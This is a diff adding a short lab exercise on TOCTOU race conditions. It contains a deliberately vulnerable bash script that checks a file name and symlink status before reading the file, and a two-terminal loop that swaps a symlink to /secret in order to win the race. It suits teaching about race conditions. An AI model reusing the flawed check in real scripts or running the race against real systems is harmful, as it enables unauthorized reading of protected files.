@@ -1,0 +1,46 @@
+TOCTOU = Time Of Check, Time Of Use
+====================================
+
+In many situation, there is a check for an object (exist, permissions, ...) and later, that object is used.
+The time between the check and the use is an opportunity window for the attacker. 
+
+Goal of that challenge: create a reliable way of exploitation
+
+
+Create secret
+=============
+echo "secret message: for your eyes only"> secret.txt
+
+Vuln code
+=========
+
+#!/bin/bash
+
+file="$1"
+# Check if the file contains "secret"
+if [[ "$file" != *"secret"* ]]; then
+    # Check if the file is a symlink
+    if [ ! -h "$file" ]; then
+        # < EXPLOITABLE WINDOW >
+        cat "$file"
+    else
+        echo "Error: File is a symlink."
+    fi
+else
+    echo "Error: File may not contain 'secret'."
+fi
+
+
+Dumb exploitation
+=================
+In terminal 1: $ while true; do ./read.sh file; done
+
+In terminal 2:
+while true; do 
+    echo 'Hello, world!' > file
+    rm file
+    ln -s /secret file
+    rm file
+done
+
+
